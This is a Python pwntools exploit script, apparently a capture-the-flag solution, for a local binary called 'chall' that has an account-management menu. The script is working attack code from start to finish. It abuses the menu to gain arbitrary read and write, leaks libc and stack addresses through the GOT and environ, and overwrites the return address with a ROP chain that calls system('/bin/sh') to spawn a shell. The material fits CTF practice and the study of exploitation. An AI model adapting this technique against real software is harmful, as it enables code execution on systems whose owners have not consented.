#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './chall', checksec=False)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

context.log_level = 'ERROR'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start()

def sla(a, b): return io.sendlineafter(a, b)
def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def rlu(a): return io.recvuntil(a)
def rl(): return io.recvline()

def itb(num: int): return str(num).encode()

def create_account(idx: int, name: bytes, passw: bytes):
    sla(b'> ', itb(1))
    sl(itb(idx))
    s(name)
    sl(passw)

def print_account(idx: int):
    sla(b'> ', itb(2))
    sla(b'> ', itb(idx))

def update_account(idx: int, name: bytes, passw: bytes):
    sla(b'> ', itb(3))
    sla(b'> ', itb(idx))
    sl(name)
    s(passw)

def exit(): sla(b'> ', itb(4))

def logleak(name: str, addr: int): print("[*] " + name + " = %#x" % addr)

def setup_arb(idx: int, addr: int):
    payload = flat(0xdeadbeef) * 2 + p32(idx) + p32(0x1) + flat(addr)
    log.info(f"Creating payload with length: {len(payload)}")
    return payload 

def arb_read(idx: int, addr: int):
    create_account(idx, setup_arb(idx+1, addr), b'AAAA')
    print_account(idx+1)
    rlu(b'a es: ')
    return u64(rl().split(b'Elige')[0].strip().ljust(8, b'\x00'))

def arb_write(idx: int, addr: int, payload: bytes):
    create_account(idx, setup_arb(idx+1, addr), b'AAAA')
    update_account(idx+1, b'AAAA', payload)

puts = arb_read(0, exe.got.puts)
libc.address = puts - libc.sym.puts
logleak("glibc base", libc.address)

env = arb_read(2, libc.sym.environ)
stack = env - 0x120
logleak("environ", env)
logleak("return address", stack)

gadgets = ROP(libc)
arb_write(4, stack, flat(gadgets.rdi.address) + flat(next(libc.search(b"/bin/sh\x00")))[:6])
arb_write(6, stack+0x10, flat(gadgets.ret.address) + flat(libc.sym.system)[:6])

rlu(b'> ')
rlu(b'> ')

exit()

io.interactive()

